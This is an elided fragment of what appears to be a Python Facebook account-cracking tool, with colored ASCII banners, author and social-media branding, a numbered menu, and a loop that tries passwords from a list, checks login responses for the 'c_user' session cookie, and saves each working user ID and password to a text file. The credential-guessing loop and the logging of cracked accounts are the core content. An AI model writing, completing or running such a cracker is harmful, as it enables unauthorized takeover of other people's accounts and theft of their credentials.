...
\x1b[1;97m🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔸🔹🔹
\033[1;32m[+] 𝗔𝗨𝗧𝗛𝗢𝗥 | Mahdi
\033[1;33m[+] 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞 | RaYees Parwiz Nikzaad
...
time.sleep(3.1)
print("")
print("\033[1;32m ᗯᗴᒪᑕOᗰᗴ TO ••RAYEES SIAVASH•• ᗷᖇᗩᑎᗪ TOOᒪՏ")
time.sleep(3.0)
os.system("clear")
print(logo)
print(" [+]𝗠𝗘𝗡𝗨  𝗠𝗘𝗧𝗛𝗢𝗗")
...
def riaz():
	...
	if riaz1 =='5':
		riaz()
	if riaz1 =='3':
		os.system('xdg-open tiktok.com/@parviznikzad663')
	if riaz1 =='4':
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[MR™Parwiz-OK] '+cid+'|'+ps+'\033[0;97m')
                open('MR™Mahdi-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
